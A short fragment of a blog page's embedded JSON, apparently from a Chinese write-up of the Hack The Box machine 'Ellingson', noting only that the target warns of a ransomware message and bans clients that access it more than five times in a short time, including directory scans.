内容告诉我们他们被Ellingson病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被ban (目录扫描也不行..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxMachine - Ellingson"},"buildId":"rYHkFZPcHeH30wRPpLsoD","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>